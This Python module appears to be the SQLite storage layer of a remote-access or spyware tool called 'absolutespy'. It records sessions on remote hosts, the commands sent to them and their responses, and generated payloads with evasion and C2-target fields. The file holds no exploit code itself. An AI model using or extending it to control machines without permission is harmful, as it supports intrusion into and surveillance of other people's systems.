#!/usr/bin/env python3
"""Database — SQLite session and command history storage."""
import sqlite3
import time
import json
import os
from typing import Optional, List, Dict

DB_PATH = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "absolutespy.db")

class Database:
    def __init__(self, path=DB_PATH):
        self.path = path
        self.conn = sqlite3.connect(path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self._init_tables()

    def _init_tables(self):
        self.conn.executescript("""
            CREATE TABLE IF NOT EXISTS sessions (
                id INTEGER PRIMARY KEY,
                ip TEXT,
                hostname TEXT DEFAULT 'unknown',
                os TEXT DEFAULT 'unknown',
                user TEXT DEFAULT 'unknown',
                status TEXT DEFAULT 'pending',
                last_seen TEXT,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP
            );

            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id INTEGER,
                command TEXT,
                response BLOB,
                timestamp TEXT DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (session_id) REFERENCES sessions(id)
            );

            CREATE TABLE IF NOT EXISTS payloads (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT,
                platform TEXT,
                modules TEXT,
                evasion TEXT,
                c2_target TEXT,
                file_path TEXT,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP
            );
        """)
        self.conn.commit()

    def create_session(self, session_id: int, ip: str):
        self.conn.execute(
            "INSERT OR REPLACE INTO sessions (id, ip, status, last_seen) VALUES (?, ?, 'pending', ?)",
            (session_id, ip, time.strftime("%Y-%m-%d %H:%M:%S"))
        )
        self.conn.commit()

    def update_session(self, session_id: int, data: Dict):
        fields = ", ".join(f"{k} = ?" for k in data)
        values = list(data.values()) + [session_id]
        self.conn.execute(
            f"UPDATE sessions SET {fields} WHERE id = ?", values
        )
        self.conn.commit()

    def get_session(self, session_id: int) -> Optional[Dict]:
        row = self.conn.execute(
            "SELECT * FROM sessions WHERE id = ?", (session_id,)
        ).fetchone()
        return dict(row) if row else None

    def get_active_sessions(self) -> List[Dict]:
        rows = self.conn.execute(
            "SELECT * FROM sessions WHERE status = 'active' OR status = 'pending' ORDER BY id"
        ).fetchall()
        return [dict(r) for r in rows]

    def kill_session(self, session_id: int):
        self.conn.execute(
            "UPDATE sessions SET status = 'terminated' WHERE id = ?", (session_id,)
        )
        self.conn.commit()

    def clean_old_sessions(self, max_age_hours: int = 24) -> int:
        cur = self.conn.execute(
            "DELETE FROM sessions WHERE last_seen < datetime('now', ?)",
            (f"-{max_age_hours} hours",)
        )
        self.conn.commit()
        return cur.rowcount

    def store_command(self, session_id: int, command: str):
        self.conn.execute(
            "INSERT INTO commands (session_id, command) VALUES (?, ?)",
            (session_id, command)
        )
        self.conn.commit()

    def store_response(self, session_id: int, data: bytes):
        self.conn.execute(
            "INSERT INTO commands (session_id, response) VALUES (?, ?)",
            (session_id, data)
        )
        self.conn.commit()

    def get_command_history(self, session_id: int, limit: int = 50) -> List[Dict]:
        rows = self.conn.execute(
            "SELECT * FROM commands WHERE session_id = ? ORDER BY timestamp DESC LIMIT ?",
            (session_id, limit)
        ).fetchall()
        return [dict(r) for r in rows]

    def store_payload(self, name: str, platform: str, modules: str,
                      evasion: str, c2_target: str, file_path: str):
        self.conn.execute(
            "INSERT INTO payloads (name, platform, modules, evasion, c2_target, file_path) VALUES (?, ?, ?, ?, ?, ?)",
            (name, platform, modules, evasion, c2_target, file_path)
        )
        self.conn.commit()
